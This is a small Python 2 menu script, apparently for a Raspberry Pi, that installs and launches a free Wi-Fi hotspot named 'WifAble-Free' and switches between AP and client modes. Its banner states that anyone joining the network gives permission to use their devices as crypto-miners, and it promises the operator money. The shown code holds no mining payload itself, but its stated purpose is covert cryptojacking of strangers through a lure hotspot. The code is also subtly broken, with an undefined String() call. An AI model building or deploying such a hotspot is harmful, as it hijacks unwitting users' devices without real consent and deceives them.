#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author          :SimplyPancake
#python_version  :2.7.6
#================================================================
				#SETUP
#================================================================
# Import the modules needed to run the script.
import sys, os

# Main definition - constants
menu_actions  = {}

# =======================
#     MENUS FUNCTIONS
# =======================

# Main menu
def main_menu():
    os.system('clear')

    print"""

##      ## #### ########    ###    ########  ##       ########
##  ##  ##  ##  ##         ## ##   ##     ## ##       ##
##  ##  ##  ##  ##        ##   ##  ##     ## ##       ##
##  ##  ##  ##  ######   ##     ## ########  ##       ######
##  ##  ##  ##  ##       ######### ##     ## ##       ##
##  ##  ##  ##  ##       ##     ## ##     ## ##       ##
 ###  ###  #### ##       ##     ## ########  ######## ########


v1.0

Please run Wif-Able installer with administrator priveleges!
With installing this script people who use your network give permission to use their devices as crypto-miners.
"""
    print "Please choose the menu you want to start:"
    print "1.   Install Wif-Able"
    print "2.   Run Wif-Able(!not running will not make you money!)"
    print "3.   Switch between AP mode and CLient mode"
    print "\n99. Quit"
    choice = raw_input(" >>  ")
    exec_menu(choice)

    return

# Execute menu
def exec_menu(choice):
    os.system('clear')
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print "Invalid selection, please try again.\n"
            menu_actions['main_menu']()
    return

# Install
def installW():
    #Here we go!!
    # https://github.com/mlabviet/RPI3_HOTSPOTS.git
    # http://ozzmaker.com/add-colour-to-text-in-python/

    os.system('clear')

    #Is WifAble already installed?
    f = open("installed.txt","r").read()
    if "1" in String(f):
        print "\033[0;37;41m WifAble is already installed. Installing again..."
    pass

    #Installing:
    print "\033[0;37;41m Installing AP..."
    print "\033[1;37;40m"
    os.system('sudo chmod +x install_ap.sh')
    os.system('sudo ./install_ap.sh')

    #Edit a file that will tell us if WifAble is already installed or not
    f = open("installed.txt","w")
    f.write("1")

    main_menu()
    return


# Run
def runW():
    print "\033[0;37;41m Make sure Wif-Able is installed first!"
    print "\033[1;37;40m"
    os.system('cd RPI3_HOTSPOTS && sudo ap WifAble-Free')
    return

def swapW():
    print "Swapping between AP mode and Client mode!"
    os.system('sudo swapwifi')

# Exit program
def exit():
    sys.exit()

# =======================
#    MENUS DEFINITIONS
# =======================

# Menu definition
menu_actions = {
    'main_menu': main_menu,
    '1': installW,
    '2': runW,
    '3': swapW,
    '99': exit,
}

# =======================
#      MAIN PROGRAM
# =======================

# Main Program
if __name__ == "__main__":
    # Launch main menu
    main_menu()
